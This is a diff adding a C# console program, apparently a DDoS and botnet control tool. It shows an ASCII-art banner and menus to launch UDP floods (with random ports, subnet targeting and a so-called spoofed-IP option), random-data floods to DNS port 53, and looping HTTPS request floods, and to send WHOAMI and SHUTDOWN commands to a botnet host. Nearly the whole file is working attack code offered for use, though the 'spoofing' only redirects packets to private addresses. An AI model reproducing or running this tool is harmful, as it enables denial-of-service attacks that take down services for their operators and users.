@@ -1,0 +1,437 @@
+using System;
+using System.Collections.Generic;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+
+namespace DDOS_Attack
+{
+    class Program
+    {
+        const int BUFFER_SIZE = 1024;
+        const string SPOOF_IP_RANGE = "192.168.1.";
+
+        static string GenerateRandomIP()
+        {
+            Random rnd = new Random();
+            int randomNum = rnd.Next(1, 254);
+            return SPOOF_IP_RANGE + randomNum.ToString();
+        }
+
+        static byte[] GenerateRandomData(int size)
+        {
+            byte[] data = new byte[size];
+            new Random().NextBytes(data);
+            return data;
+        }
+
+        static void DDOSAttack(string targetIP, int targetPort, int numConnections, bool useSubnet, bool useRandomPort, bool useSpoofedIP, int attackDuration)
+        {
+            ManualResetEvent attackFinished = new ManualResetEvent(false);
+            List<Thread> threads = new List<Thread>();
+
+            for (int i = 0; i < numConnections; i++)
+            {
+                Thread thread = new Thread(() =>
+                {
+                    try
+                    {
+                        Random rnd = new Random();
+                        using (UdpClient udpClient = new UdpClient())
+                        {
+                            string ipToAttack = targetIP;
+                            int portToAttack = targetPort;
+
+                            if (useSubnet)
+                            {
+                                ipToAttack = targetIP.Substring(0, targetIP.LastIndexOf('.') + 1) + rnd.Next(1, 254);
+                            }
+
+                            DateTime endTime = DateTime.Now.AddSeconds(attackDuration);
+
+                            while (DateTime.Now < endTime)
+                            {
+                                if (useRandomPort)
+                                {
+                                    portToAttack = rnd.Next(1, 65535);
+                                }
+
+                                byte[] data = GenerateRandomData(BUFFER_SIZE);
+
+                                if (useSpoofedIP)
+                                {
+                                    string spoofedIP = GenerateRandomIP();
+                                    IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(spoofedIP), portToAttack);
+                                    udpClient.Send(data, data.Length, endPoint);
+                                }
+                                else
+                                {
+                                    udpClient.Send(data, data.Length, ipToAttack, portToAttack);
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Error: " + ex.Message);
+                    }
+                    finally
+                    {
+                        attackFinished.Set();
+                    }
+                });
+
+                thread.Start();
+                threads.Add(thread);
+            }
+
+            foreach (Thread thread in threads)
+            {
+                thread.Join();
+            }
+
+            attackFinished.WaitOne();
+        }
+
+        static void DNS_DDOSAttack(string targetIP, int numRequests, int attackDuration)
+        {
+            try
+            {
+                using (UdpClient udpClient = new UdpClient())
+                {
+                    IPAddress[] addresses = Dns.GetHostAddresses(targetIP);
+                    if (addresses.Length > 0)
+                    {
+                        IPEndPoint dnsEndPoint = new IPEndPoint(addresses[0], 53);
+                        Random rnd = new Random();
+                        DateTime endTime = DateTime.Now.AddSeconds(attackDuration);
+
+                        while (DateTime.Now < endTime)
+                        {
+                            for (int i = 0; i < numRequests; i++)
+                            {
+                                byte[] data = GenerateRandomData(BUFFER_SIZE);
+                                udpClient.Send(data, data.Length, dnsEndPoint);
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+        }
+
+        static void HTTPS_DDOSAttack(string targetURL, int numConnections, int attackDuration)
+        {
+            ManualResetEvent attackFinished = new ManualResetEvent(false);
+            List<Thread> threads = new List<Thread>();
+
+            for (int i = 0; i < numConnections; i++)
+            {
+                Thread thread = new Thread(() =>
+                {
+                    try
+                    {
+                        using (WebClient client = new WebClient())
+                        {
+                            DateTime endTime = DateTime.Now.AddSeconds(attackDuration);
+
+                            while (DateTime.Now < endTime)
+                            {
+                                client.DownloadData(targetURL);
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Error: " + ex.Message);
+                    }
+                    finally
+                    {
+                        attackFinished.Set();
+                    }
+                });
+
+                thread.Start();
+                threads.Add(thread);
+            }
+
+            foreach (Thread thread in threads)
+            {
+                thread.Join();
+            }
+
+            attackFinished.WaitOne();
+        }
+
+        static void Main(string[] args)
+        {
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Clear(); // Clear screen
+
+            // Display ASCII art
+            Console.WriteLine(" ___  __    ___  ___  ________      ___    ___ ________  ________  ________     ");
+            Console.WriteLine(@"|\  \|\  \ |\  \|\  \|\_____  \    |\  \  /  /|\   __  \|\   __  \|\  ___  \    ");
+            Console.WriteLine(@"\ \  \/  /|\ \  \\\  \\|___/  /|   \ \  \/  / | \  \|\  \ \  \|\  \ \____   \   ");
+            Console.WriteLine(@" \ \   ___  \ \  \\\  \   /  / /    \ \    / / \ \   __  \ \  \\\  \|____|\  \  ");
+            Console.WriteLine(@"  \ \  \\ \  \ \  \\\  \ /  /_/__    \/  /  /   \ \  \ \  \ \  \\\  \  __\_\  \ ");
+            Console.WriteLine(@"   \ \__\\ \__\ \_______\\________\__/  / /      \ \__\ \__\ \_______\|\_______\");
+            Console.WriteLine(@"    \|__| \|__|\|_______|\|_______|\___/ /        \|__|\|__|\|_______|\|_______|");
+            Console.WriteLine(@"                                  \|___|/                                        ");
+
+            Console.WriteLine(); // Add a blank line for spacing
+
+            string botnetHost = null;
+            string botnetIP = null;
+            int botnetPort = 0;
+
+            while (true)
+            {
+                if (botnetHost == null)
+                {
+                    Console.WriteLine("Botnet Command Menu:");
+                    Console.WriteLine("1. Connect to Botnet");
+                    Console.WriteLine("2. Exit");
+                    Console.Write("Enter your choice: ");
+                    string choice = Console.ReadLine();
+
+                    switch (choice)
+                    {
+                        case "1":
+                            ConnectToBotnet(out botnetHost, out botnetIP, out botnetPort);
+                            break;
+                        case "2":
+                            Console.WriteLine("Exiting...");
+                            return;
+                        default:
+                            Console.WriteLine("Invalid choice. Please enter a valid option.");
+                            break;
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("Botnet Command Menu:");
+                    Console.WriteLine("1. Start UDP DDOS Attack");
+                    Console.WriteLine("2. Start DNS DDOS Attack");
+                    Console.WriteLine("3. Start HTTPS DDOS Attack");
+                    Console.WriteLine("4. Check Online Bots");
+                    Console.WriteLine("5. Shutdown Botnet");
+                    Console.WriteLine("6. Disconnect from Botnet");
+                    Console.WriteLine("7. Exit");
+
+                    Console.Write("Enter your choice: ");
+                    string choice = Console.ReadLine();
+
+                    switch (choice)
+                    {
+                        case "1":
+                            {
+                                string udpTargetIP = GetValidIPAddress("Enter the target IP for UDP attack: ");
+                                int udpTargetPort = GetValidPort("Enter the target port for UDP attack: ");
+                                int udpNumConnections = GetValidNumber("Enter the number of connections: ");
+                                bool useSubnet = GetValidBool("Use subnet for attack? (y/n): ");
+                                bool useRandomPort = GetValidBool("Use random port? (y/n): ");
+                                bool useSpoofedIP = GetValidBool("Use spoofed IP? (y/n): ");
+                                int udpAttackDuration = GetValidNumber("Enter the attack duration in seconds: ");
+
+                                DDOSAttack(udpTargetIP, udpTargetPort, udpNumConnections, useSubnet, useRandomPort, useSpoofedIP, udpAttackDuration);
+                            }
+                            break;
+                        case "2":
+                            {
+                                string dnsTargetIP = GetValidIPAddress("Enter the target IP for DNS attack: ");
+                                int numRequests = GetValidNumber("Enter the number of requests per second: ");
+                                int dnsAttackDuration = GetValidNumber("Enter the attack duration in seconds: ");
+
+                                DNS_DDOSAttack(dnsTargetIP, numRequests, dnsAttackDuration);
+                            }
+                            break;
+                        case "3":
+                            {
+                                string httpsTargetURL = GetValidURL("Enter the target URL for HTTPS attack: ");
+                                int numConnections = GetValidNumber("Enter the number of connections: ");
+                                int httpsAttackDuration = GetValidNumber("Enter the attack duration in seconds: ");
+
+                                HTTPS_DDOSAttack(httpsTargetURL, numConnections, httpsAttackDuration);
+                            }
+                            break;
+                        case "4":
+                            CheckOnlineBots(botnetIP, botnetPort);
+                            break;
+                        case "5":
+                            ShutdownBotnet(botnetIP, botnetPort);
+                            break;
+                        case "6":
+                            botnetHost = null;
+                            botnetIP = null;
+                            botnetPort = 0;
+                            Console.WriteLine("Disconnected from Botnet.");
+                            break;
+                        case "7":
+                            Console.WriteLine("Exiting...");
+                            return;
+                        default:
+                            Console.WriteLine("Invalid choice. Please enter a valid option.");
+                            break;
+                    }
+                }
+            }
+        }
+
+        static void ConnectToBotnet(out string host, out string ip, out int port)
+        {
+            host = GetValidHostname("Enter the botnet host: ");
+            ip = ResolveHostnameToIP(host);
+            port = GetValidPort("Enter the botnet port: ");
+
+            if (ip == null || port == 0)
+            {
+                Console.WriteLine("Failed to connect to botnet.");
+            }
+            else
+            {
+                Console.WriteLine("Connected to botnet at " + ip + ":" + port);
+            }
+        }
+
+        static void ShutdownBotnet(string botnetIP, int botnetPort)
+        {
+            try
+            {
+                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
+                using (NetworkStream stream = client.GetStream())
+                {
+                    byte[] command = Encoding.ASCII.GetBytes("SHUTDOWN");
+                    stream.Write(command, 0, command.Length);
+                    Console.WriteLine("Shutdown command sent to botnet.");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error shutting down botnet: " + ex.Message);
+            }
+        }
+
+        static void CheckOnlineBots(string botnetIP, int botnetPort)
+        {
+            try
+            {
+                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
+                using (NetworkStream stream = client.GetStream())
+                {
+                    byte[] command = Encoding.ASCII.GetBytes("WHOAMI");
+                    stream.Write(command, 0, command.Length);
+
+                    byte[] responseBuffer = new byte[BUFFER_SIZE];
+                    StringBuilder responseBuilder = new StringBuilder();
+                    int bytesRead;
+
+                    while ((bytesRead = stream.Read(responseBuffer, 0, responseBuffer.Length)) > 0)
+                    {
+                        responseBuilder.Append(Encoding.ASCII.GetString(responseBuffer, 0, bytesRead));
+
+                        if (responseBuilder.ToString().Contains("END OF RESPONSE"))
+                        {
+                            break;
+                        }
+                    }
+
+                    string response = responseBuilder.ToString().Trim();
+                    Console.WriteLine("Online bots (WHOAMI Output):\n" + response);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error checking online bots: " + ex.Message);
+            }
+        }
+
+        static string GetValidIPAddress(string prompt)
+        {
+            Console.Write(prompt);
+            string ip = Console.ReadLine();
+            if (IPAddress.TryParse(ip, out _))
+            {
+                return ip;
+            }
+            else
+            {
+                Console.WriteLine("Invalid IP address.");
+                return null;
+            }
+        }
+
+        static string GetValidURL(string prompt)
+        {
+            Console.Write(prompt);
+            string url = Console.ReadLine();
+            if (Uri.TryCreate(url, UriKind.Absolute, out _))
+            {
+                return url;
+            }
+            else
+            {
+                Console.WriteLine("Invalid URL.");
+                return null;
+            }
+        }
+
+        static int GetValidNumber(string prompt)
+        {
+            Console.Write(prompt);
+            if (int.TryParse(Console.ReadLine(), out int number) && number > 0)
+            {
+                return number;
+            }
+            else
+            {
+                Console.WriteLine("Invalid number.");
+                return 0;
+            }
+        }
+
+        static bool GetValidBool(string prompt)
+        {
+            Console.Write(prompt);
+            string input = Console.ReadLine().ToLower();
+            return input == "y" || input == "yes";
+        }
+
+        static int GetValidPort(string prompt)
+        {
+            Console.Write(prompt);
+            if (int.TryParse(Console.ReadLine(), out int port) && port >= 1 && port <= 65535)
+            {
+                return port;
+            }
+            else
+            {
+                Console.WriteLine("Invalid port number.");
+                return 0;
+            }
+        }
+
+        static string GetValidHostname(string prompt)
+        {
+            Console.Write(prompt);
+            return Console.ReadLine();
+        }
+
+        static string ResolveHostnameToIP(string hostname)
+        {
+            try
+            {
+                IPAddress[] addresses = Dns.GetHostAddresses(hostname);
+                return addresses.Length > 0 ? addresses[0].ToString() : null;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error resolving hostname: " + ex.Message);
+                return null;
+            }
+        }
+    }
+}
